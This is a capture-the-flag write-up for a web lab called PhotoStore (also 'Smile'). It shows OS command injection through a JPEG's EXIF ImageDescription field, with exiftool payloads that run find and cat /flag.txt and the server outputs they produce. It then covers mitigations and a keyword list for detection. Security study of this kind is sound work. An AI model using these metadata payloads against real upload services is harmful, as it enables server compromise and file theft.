---
title: "Command Injection through EXIF Metadata Processing | PhotoStore"
date: 2026-06-28 10:15:00 +0530
categories: [A05 - Injection, Command Injection]
tags: [command-injection, exif-metadata, image-processing, file-upload, webverse, owasp-2025]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/photostore-metadata-command-injection.webp
  alt: "Smile command injection through EXIF image metadata"
---

## Lab Link

[PhotoStore](https://dashboard.webverselabs-pro.com/labs/photostore)

## Overview

The **Smile** lab exposed an image-processing feature that extracted and processed EXIF metadata from uploaded JPEG files. During testing, the `ImageDescription` EXIF field was reflected back in the API response, and a separate response field named `metadata_processed` showed that the server was evaluating the metadata content instead of treating it as plain text.

By placing an operating-system command inside the image metadata, the backend executed the command during metadata processing. This allowed filesystem enumeration and eventually reading the flag from `/flag.txt`.

## Objective

The objective was to identify the vulnerable metadata-processing path, confirm command execution, locate the flag file, and read its contents.

## Vulnerability Identification

- **OWASP Top 10:2025:** A05 - Injection
- **Vulnerability Family:** OS Command Injection
- **Root Cause:** Unsafe evaluation of user-controlled EXIF metadata
- **Impact:** Remote command execution in the context of the image-processing service

The vulnerable behavior appeared when the backend processed the `ImageDescription` EXIF field. Instead of storing or displaying this field safely, the application interpreted metadata content as executable logic.

## Reconnaissance

A normal JPEG upload returned structured metadata information:

```json
{
  "dimensions": "600x800",
  "filename": "test.jpg",
  "format": "JPEG",
  "image_description": null,
  "metadata_processed": null,
  "size_bytes": 39195
}
```

The response showed that the application parsed image metadata and returned the extracted fields. The interesting field was `metadata_processed`, which suggested that the server performed additional processing on metadata values.

## Exploitation

### Step 1: Inject a Command into EXIF Metadata

A JPEG file was modified locally using `exiftool`, placing a command inside the `ImageDescription` field.

```bash
exiftool -ImageDescription='system("find / -type f -name *flag.txt*  2>/dev/null")' test.jpg -o flag.jpg
```

After uploading the modified image, the server response confirmed that the metadata was processed and the command output was returned:

```json
{
  "dimensions": "600x800",
  "filename": "flag.jpg",
  "format": "JPEG",
  "image_description": "system(\"find / -type f -name *flag.txt*  2>/dev/null\")",
  "metadata_processed": "/flag.txt",
  "size_bytes": 39263
}
```

This confirmed command execution and revealed the flag path:

```text
/flag.txt
```

### Step 2: Read the Flag File

The same metadata injection technique was used to read `/flag.txt`.

```bash
exiftool -overwrite_original -ImageDescription='system("cat /flag.txt")' flag.jpg
```

After uploading the updated image, the application executed the command and returned the file contents in `metadata_processed`.

```json
{
  "dimensions": "600x800",
  "filename": "flag.jpg",
  "format": "JPEG",
  "image_description": "system(\"cat /flag.txt\")",
  "metadata_processed": "WEBVERSE{.....}",
  "size_bytes": 39231
}
```

## Proof of Exploitation

The vulnerable image-processing workflow executed commands embedded in the JPEG `ImageDescription` EXIF field.

Final proof:

```text
metadata_processed: WEBVERSE{.....}
```

The real flag has been redacted for publication.

## Root Cause

The application trusted user-controlled image metadata and passed it into a dangerous processing routine. The presence of payloads such as:

```text
system("cat /flag.txt")
```

indicates that metadata was evaluated as code or passed into an unsafe interpreter instead of being handled as inert text.

The vulnerable pattern is conceptually similar to:

```php
eval($imageDescription);
```

or any equivalent dynamic evaluation mechanism that allows metadata content to invoke system-level functionality.

## Impact

Successful exploitation allowed an attacker to:

- Execute arbitrary operating-system commands.
- Enumerate files on the server.
- Read sensitive local files.
- Access the challenge flag.
- Potentially pivot further depending on service privileges and filesystem access.

Because the command executed server-side, this issue should be treated as remote command execution.

## Mitigation

### Treat Metadata as Untrusted Input

EXIF fields must be parsed and stored as plain data only. User-controlled metadata should never be evaluated as code.

### Remove Dangerous Evaluation

Avoid dangerous functions such as:

```php
eval()
system()
exec()
shell_exec()
passthru()
popen()
proc_open()
```

If metadata processing requires templates or expressions, use a strict allowlist-based parser rather than dynamic evaluation.

### Sanitize Uploaded Images

Strip metadata from uploaded images before processing or storing them.

```bash
exiftool -all= uploaded.jpg
```

For production workflows, use a dedicated image-processing library that rewrites the image and discards unsafe metadata.

### Restrict Runtime Permissions

The image-processing service should run with least privilege:

- No access to sensitive files.
- No shell execution capability.
- Read-only filesystem where possible.
- Container sandboxing enabled.
- Separate user account for processing tasks.

### Add Detection and Logging

Log suspicious metadata values containing command execution keywords such as:

```text
system(
exec(
shell_exec(
cat /
find /
```

These events should be treated as high-confidence exploitation attempts.

## Lessons Learned

Image metadata is user input. Even though EXIF fields are often treated as harmless descriptive data, they can become dangerous when passed into unsafe processing logic. The lab demonstrated how a single metadata field was enough to move from upload functionality to command execution and sensitive file disclosure.
